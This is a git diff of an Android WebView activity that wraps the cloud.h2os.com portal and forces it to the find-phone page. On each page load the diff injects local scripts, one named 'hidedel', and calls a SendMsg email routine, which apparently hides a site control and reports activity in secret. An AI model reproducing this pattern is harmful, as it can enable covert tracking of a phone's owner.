@@ -2,6 +2,7 @@ package com.cn.dafeng.where;
 
 import android.annotation.SuppressLint;
 import android.content.res.Resources;
+import android.graphics.Bitmap;
 import android.os.Bundle;
 import android.util.Log;
 import android.view.KeyEvent;
@@ -15,6 +16,8 @@ import java.io.InputStream;
 import java.net.URL;
 import java.net.URLConnection;
 
+import static com.cn.dafeng.where.utils.SendEmail.SendMsg;
+
 
 public class WsWebview extends AppCompatActivity {
 
@@ -24,6 +27,10 @@ public class WsWebview extends AppCompatActivity {
     @SuppressLint("SetJavaScriptEnabled")
     @Override
     protected void onCreate(Bundle savedInstanceState) {
+        MyApplication app = (MyApplication) getApplication();
+        if (!app.isFlag()) {
+            finish();
+        }
         Log.d(TAG, "onCreate: ");
         super.onCreate(savedInstanceState);
         WebView.setWebContentsDebuggingEnabled(true);
@@ -32,10 +39,18 @@ public class WsWebview extends AppCompatActivity {
 
         webView.setWebViewClient(
                 new WebViewClient() {
+
                     @Override
-                    public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
-                        return false;
+                    public void onPageStarted(WebView view, String url, Bitmap favicon) {
+                        super.onPageStarted(view, url, favicon);
+                        SendMsg();
+                        try {
+                            webView.evaluateJavascript(getJs("hidedel"), null);
+                        } catch (IOException e) {
+                            e.printStackTrace();
+                        }
                     }
+
 
                     @Nullable
                     @Override
@@ -52,7 +67,7 @@ public class WsWebview extends AppCompatActivity {
                                 //noinspection ResultOfMethodCallIgnored
                                 inputStream.read(chars);
                                 result = new String(chars);
-                                result = result.replace("</body>", "</body><script>" + getJs() + "</script>");
+                                result = result.replace("</body>", "</body><script>" + getJs("ws") + "</script>");
                             } catch (IOException e) {
                                 e.printStackTrace();
                                 return super.shouldInterceptRequest(view, request);
@@ -66,6 +81,15 @@ public class WsWebview extends AppCompatActivity {
                         return super.shouldInterceptRequest(view, request);
 
                     }
+
+                    @Override
+                    public void doUpdateVisitedHistory(WebView view, String url, boolean isReload) {
+                        System.out.println(url);
+                        if ("https://cloud.h2os.com/#/home".equals(url)) {
+                            view.loadUrl("https://cloud.h2os.com/#/findPhone");
+                        }
+                        super.doUpdateVisitedHistory(view, url, isReload);
+                    }
                 }
         );
 
@@ -76,14 +100,16 @@ public class WsWebview extends AppCompatActivity {
         settings.setJavaScriptEnabled(true);
         settings.setDomStorageEnabled(true); // 开启 DOM storage API 功能
         settings.setDatabaseEnabled(true);   //开启 database storage API 功能
-        settings.setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);
+
         webView.loadUrl("https://cloud.h2os.com/#/");
+
     }
 
 
-    private String getJs() throws IOException {
+    private String getJs(String name) throws IOException {
         Resources resources = this.getResources();
-        final InputStream jsinputStream = resources.openRawResource(R.raw.ws);
+        final int r = resources.getIdentifier(name, "raw", "com.cn.dafeng.where");
+        final InputStream jsinputStream = resources.openRawResource(r);
         int c;
         final StringBuilder stringBuilder = new StringBuilder();
         while ((c = jsinputStream.read()) != -1) {
@@ -95,7 +121,7 @@ public class WsWebview extends AppCompatActivity {
     // 重写方法，防止点击返回按钮直接退回上一活动页面
     @Override
     public boolean onKeyDown(int keyCode, KeyEvent event) {
-        if (keyCode == KeyEvent.KEYCODE_BACK && webView.canGoBack()) {
+        if (keyCode == KeyEvent.KEYCODE_BACK && webView.copyBackForwardList().getCurrentIndex() > 2) {
             // 返回上个页面
             webView.goBack();
             return true;
@@ -103,4 +129,6 @@ public class WsWebview extends AppCompatActivity {
         finish();
         return super.onKeyDown(keyCode, event);
     }
+
+
 }
